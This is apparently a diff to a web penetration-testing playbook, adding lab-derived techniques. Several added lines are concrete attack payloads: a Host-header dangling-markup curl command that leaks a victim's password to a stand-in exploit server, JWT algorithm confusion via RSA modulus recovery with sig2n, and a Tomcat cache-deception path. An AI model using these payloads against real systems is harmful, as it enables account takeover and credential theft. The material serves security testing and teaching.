@@ -388,6 +388,7 @@ Consult the signup_patterns_cheatsheet resource for Bitwarden CLI, TextVerified 
     - **Lab reference (OAuth forced profile linking):** Missing \`state\` parameter in OAuth "attach social profile" flow enables CSRF — attacker's authorization code is bound to victim's account, giving attacker OAuth login access.
     - **Lab reference (OAuth redirect_uri hijacking):** Unvalidated \`redirect_uri\` allows attacker to steal authorization code via CSRF iframe — deliver auth URL with \`redirect_uri=https://attacker.com\`, victim's code is sent to attacker who exchanges it to log in as victim.
     - **Lab reference (OAuth token theft via open redirect):** Partially validated \`redirect_uri\` bypassed via path traversal (\`../\`) to chain an open redirect on the legitimate domain — implicit flow access token forwarded to attacker via fragment; test \`..%2f\` encoding variants.
+    - **Lab reference (Host header dangling markup):** Inject dangling \`<a href="https://exploit-server.com/exploit?\` in Host header of password reset request — unclosed tag captures password from HTML email body until next quote character.
 
 ## Phase 3: JWT Testing (if JWT auth is detected)
 13. Decode the JWT header and payload (base64 decode, do NOT verify signature yet).
@@ -397,6 +398,7 @@ Consult the signup_patterns_cheatsheet resource for Bitwarden CLI, TextVerified 
 16. Check for JWK/JKU header injection — can you supply your own key?
 17. Check KID parameter for path traversal: \`"kid": "../../dev/null"\` with empty symmetric key.
 18. Test claim manipulation: change "sub", "role", "admin" fields and re-sign with cracked/injected key.
+    - **Lab reference (Algorithm confusion without exposed key):** When public key is NOT available at any endpoint, derive it from 2 JWTs: compute GCD of (s1^e - m1, s2^e - m2) to recover RSA modulus n, reconstruct PEM, then HS256 confusion.
 
 ## Phase 4: CSRF Testing
 19. For every state-changing action (email change, password change, profile update):
@@ -501,6 +503,7 @@ Consult the signup_patterns_cheatsheet resource for Bitwarden CLI, TextVerified 
     - **Lab reference (WCD path delimiters):** Origin treats \`;\` as path parameter delimiter (strips suffix), cache sees \`.js\` extension and caches — request \`/my-account;exploit.js\`.
     - **Lab reference (WCD origin normalization):** Origin normalizes \`..%2f\`, cache doesn't — \`/resources/..%2fmy-account\` serves account page cached under literal path.
     - **Lab reference (WCD cache normalization):** Cache normalizes \`..%2f\`, origin doesn't + \`%23\` as origin delimiter — \`/my-account%23%2f..%2fstatic/exploit.js\` caches account page under \`/static/exploit.js\`.
+    - **Lab reference (WCD exact-match cache rules):** Tomcat \`;\` path parameter + \`..%2f\` normalization — \`/js/tracking.js;%0a..%2f..%2fmy-account\` matches exact cache rule for \`/js/tracking.js\`, but origin resolves to \`/my-account\` via path parameter stripping and dot-segment normalization.
 
 ## Phase 12: API-Specific Testing
 34. If GraphQL endpoint found:
@@ -1232,6 +1235,21 @@ curl -sk "${target_url}/.well-known/jwks.json" | jq '.keys[0]'
 # Convert JWK to PEM if needed, then sign with it as HS256 secret
 \`\`\`
 
+## Step 4b: Algorithm Confusion WITHOUT Exposed Key (RSA Key Derivation)
+If the server does NOT expose its public key at any well-known endpoint:
+1. Obtain two different valid JWTs (login twice, use different sessions).
+2. Both are signed with the same RSA private key. Extract signature (s) and message hash (m) from each.
+3. Compute \`s^e - m\` for each (e = 65537). The result is a multiple of n (the RSA modulus).
+4. Compute \`GCD(s1^e - m1, s2^e - m2)\` to recover n.
+5. Reconstruct the public key PEM from (n, e).
+6. Use the recovered public key as the HS256 HMAC secret.
+\`\`\`
+# Use sig2n tooling to derive the key:
+docker run --rm -it portswigger/sig2n <jwt1> <jwt2>
+# Try each candidate PEM key to sign a forged HS256 token
+\`\`\`
+This works because RSA: s^e ≡ m (mod n), so s^e - m is always divisible by n.
+
 ## Step 5: JWK Header Injection
 Embed your own signing key directly in the JWT header:
 \`\`\`json
@@ -1430,6 +1448,15 @@ curl -sk -X POST "${target_url}/forgot-password" \\
   -H "Host: attacker.com" \\
   -d "email=victim@example.com"
 \`\`\`
+
+### 5d. Host Header Dangling Markup (Password Capture)
+When the app reflects the Host header in HTML password reset emails, inject a dangling markup \`<a>\` tag:
+\`\`\`
+curl -sk -X POST "${target_url}/forgot-password" \\
+  -H "Host: target.com:'<a href=\\"https://exploit-server.com/exploit?" \\
+  -d "username=victim"
+\`\`\`
+The unclosed \`<a>\` tag extends its href across subsequent email content (including the plaintext password) until the next quote character. The victim viewing the email leaks the captured content to the attacker's server. Requires HTML email format and Host header reflection without strict validation.
 
 ## Step 6: Verification
 For every finding:
